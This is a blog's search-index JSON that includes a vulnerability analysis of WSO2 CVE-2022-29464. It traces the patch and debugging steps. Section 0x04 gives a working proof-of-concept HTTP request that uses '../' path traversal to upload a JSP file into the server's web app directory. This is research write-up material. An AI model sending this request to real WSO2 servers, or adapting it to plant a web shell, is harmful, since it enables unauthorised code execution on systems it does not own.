{"pages":[{"title":"test","text":"","link":"/about/index.html"}],"posts":[{"title":"HelloWorld","text":"0x00 ~$ whoamiI’m a Cyber Security Researcher.I mayjor in Web Security. 0x01 ~$ ls -al my_skillPenetration,Code Review,Java,Python 0x02 ~$ cat my_blogI want to share some security skills and something instresting from mylife on this blog.","link":"/2022/04/10/HelloWorld/"},{"title":"Wso2_Vul_Analysis_cve_2022_29464","text":"0x00 Official informationOn Apr 20,I found that someone posted a meesage on twitter.It was a message about cve-2022-29464.Actually, we can get a lot of information of this vuln from wso2 official website and cve website. 1https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738 Obviously,it is an unrestricted arbitrary file upload vulnerability.I installed a test enviroment and analyse the patch,so that I got the real poc by using reverse engineering. 1https://github.com/wso2/product-apim/releases 0x01 Patch1https://github.com/wso2/carbon-kernel/pull/3152/files/13795df0a5b6a2206fd0338abfff057a7b99e1bb There are two package files that have been modified. Using method verifyCanonicalDestination to verify allowed file extension on FileUploadService.java In package org.wso2.carbon.ui, these files have been deteled.And the class AnyFileUploadExecHandler have been removed from AnyFileUploadExecHandler. deleted1234JarZipUploadExecutor.javaKeyStoreFileUploadExecutor.javaToolsAnyFileUploadExecutor.javaToolsFileUploadExecutor.java modified1AnyFileUploadExecHandler These were key information for me at that time. 0x02 Wrong DirectionAt first,I thoght that FileUploadService.java would be the trigger point for this vulnerability.I spent lots of time to build my POC by using this way.Because FileUploadService.java could be called by FileUploadService.wsdl. As you can see,it didn’t work.It needed authorization to access to the server. 0x03 Right DirectionWhen I went back to see the details of this vulnerability on official website,I found that we were asked to add some rules fix the bug.That may be the key point to this vulnerability.I found that the web path “/fileupload” on FileUploadExecutorManager.class I changed wso2 server to debug mode with –debug.And I had to seek the real api path to upload file. When i used path “/fileupload/“ + random path, such as /fileupload/testtest,no file was being created.When I use “/fileupload/“ + “resource”,the server returned a exception string to me.When I was trying to debug and finding what happened inside,I found that iterator would return strings list 1key,resource,anyFiles,... The corresponding code would be called by key variable.It means that if we change path to “/fileupload/toolsAny”,ToolsAnyFileUploadExecutor.java will be called.Directory will be set as “../extra/..”. We can control the filename so that “../“ will be used to upload arbitrary file. stacks 12345678parseRequest:347, FileUploadBase (org.apache.commons.fileupload)parseRequest:220, AbstractFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload)parseRequest:152, AbstractFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload)executeGeneric:103, AbstractFileUploadExecutor (org.wso2.carbon.ui.transports.fileupload)execute:436, FileUploadExecutorManager$CarbonXmlFileUploadExecHandler (org.wso2.carbon.ui.transports.fileupload)startExec:320, FileUploadExecutorManager$FileUploadExecutionHandlerManager (org.wso2.carbon.ui.transports.fileupload)execute:127, FileUploadExecutorManager (org.wso2.carbon.ui.transports.fileupload)doPost:57, FileUploadServlet (org.wso2.carbon.ui.transports) 0x04 POC1234567891011121314151617POST /fileupload/toolsAny HTTP/1.1Host: 127.0.0.1:9443User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311Content-Length: 319Connection: closeurn:uploadFilesUpgrade-Insecure-Requests: 1-----------------------------250033711231076532771336998311Content-Disposition: form-data; name=&quot;../../../../repository/deployment/server/jaggeryapps/publisher/cmd.jsp&quot;;filename=&quot;cmd.jsp&quot;Content-Type: application/octet-stream&lt;% out.print(&quot;123&quot;); %&gt;-----------------------------250033711231076532771336998311-- 0x05 Referencehttps://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738https://github.com/wso2/carbon-kernel/pull/3152/files/13795df0a5b6a2206fd0338abfff057a7b99e1bbhttps://twitter.com/vcslab/status/1516369262469738496","link":"/2022/04/21/Wso2-Vul-Analysis-cve-2022-29464/"}],"tags":[{"name":"daily_life","slug":"daily-life","link":"/tags/daily-life/"},{"name":"Vulnerability Analysis","slug":"Vulnerability-Analysis","link":"/tags/Vulnerability-Analysis/"}],"categories":[]}